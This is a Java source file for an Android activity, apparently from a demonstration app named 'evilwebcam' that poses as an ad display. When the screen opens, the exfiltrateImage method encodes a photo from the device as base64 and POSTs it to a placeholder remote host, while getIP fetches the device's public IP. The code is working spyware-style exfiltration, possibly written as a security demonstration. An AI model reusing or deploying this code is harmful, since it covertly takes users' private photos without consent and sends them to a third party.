package org.denknerd.evilwebcam;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.ArrayList;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.util.Base64;
import android.widget.TextView;

public class ShowAdActivity extends Activity {

	private String mCurrentPhotoPath;
	private TextView tv;

	private void exfiltrateImage(){
		U.l("Exfiltrating " + mCurrentPhotoPath + "...");
		final TextView tv = (TextView)findViewById(R.id.scaryMessage);
        
		if (mCurrentPhotoPath == null) {
			tv.setText("No image to exfiltrate.");
			return;
		}
		File f = new File(mCurrentPhotoPath);
		if(!f.exists() || f.isDirectory()) { 
			tv.setText("No image to exfiltrate.");
			return;
		}
		
		new Thread(new Runnable() {
			
			@Override
			public void run() {

				Bitmap bitmapOrg = BitmapFactory.decodeFile(mCurrentPhotoPath);
		       
		        //Resize the image
		        double width  = bitmapOrg.getWidth();
		        double height = bitmapOrg.getHeight();
		        double ratio = 400/width;
		        int newheight = (int)(ratio * height);

		        U.l("-orig-width = " + width);
		        U.l("-orig-height= " + height);

		        bitmapOrg = Bitmap.createScaledBitmap(bitmapOrg, 400, newheight, true);

		        ByteArrayOutputStream bao = new ByteArrayOutputStream();
		        bitmapOrg.compress(Bitmap.CompressFormat.JPEG, 80, bao);
		        byte[] ba = bao.toByteArray();
		        String ba1 = Base64.encodeToString(ba, Base64.DEFAULT);

		        U.l("-- uploading image now --\n" + ba1);
		        
		        ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
		        nameValuePairs.add(new BasicNameValuePair("image", ba1));
		        nameValuePairs.add(new BasicNameValuePair("id", "random11"));
			
				try {
					HttpClient httpclient = new DefaultHttpClient();
					HttpPost httppost = new HttpPost("http://www.yoursite.com/script.php");
						 
					httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

		            HttpResponse response = httpclient.execute(httppost);
		            HttpEntity entity = response.getEntity();               

		            // print response
		            String output = EntityUtils.toString(entity);
		            U.l("POST RESPONSE: " + output);

		            U.l("upload succeeded.");
		            
		            tv.post(new Runnable() {
						
						@Override
						public void run() {
							tv.setText("Successfully exfiltrated image.");						
						}
					});

		            bitmapOrg.recycle();
					
				} catch (Exception e) {
					e.printStackTrace();
					U.l("Connection error.");
				}
				
			}
		}).start();
		
		U.l("Done.");
	}

	private void getIP() {
		U.l("trying to get ip.");

		// here we just demonstrate an internet connection.
		// this might be to fetch an ad from a remote server.

		new Thread(new Runnable() {
			@Override
			public void run() {

				try {
					URL url;
					InputStream in = null;
					url = new URL("https://httpbin.org/ip");
					in = url.openStream();

					InputStreamReader reader = null;
					if (in != null) {
						reader = new InputStreamReader(in);
					}
					// read the JSON data

					String result = "";
					int data;
					data = reader.read();
					while(data != -1){
						char theChar = (char) data;
						result = result + theChar;
						data = reader.read();
					}

					reader.close();    
					U.l("json retrieved: " + result);
					JSONObject jObject = new JSONObject(result);
					final String aJsonString = jObject.getString("origin");

					tv.post(new Runnable() {
						@Override
						public void run() {
							tv.setText(aJsonString);
						}
					});
				} catch (Exception e) {

					e.printStackTrace();
					
					tv.post(new Runnable() {
						
						@Override
						public void run() {
							tv.setText("Error!");
						}
					});

					U.l("Oops, something went wrong connecting to the internet.");				}

			}
		}).start();

	}

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		setContentView(R.layout.activity_showad);
		
		tv = (TextView) findViewById(R.id.tvIP);

		Intent intent = getIntent();
		mCurrentPhotoPath = intent.getStringExtra(MainActivity.EXTRA_MESSAGE);

		getIP();
		exfiltrateImage();

	}
	
	
	@Override
	protected void onSaveInstanceState(Bundle outState) {
		super.onSaveInstanceState(outState);
		
		if (mCurrentPhotoPath != null) {
			outState.putString(MainActivity.MYFILENAME, mCurrentPhotoPath);
		}
	}
	
}
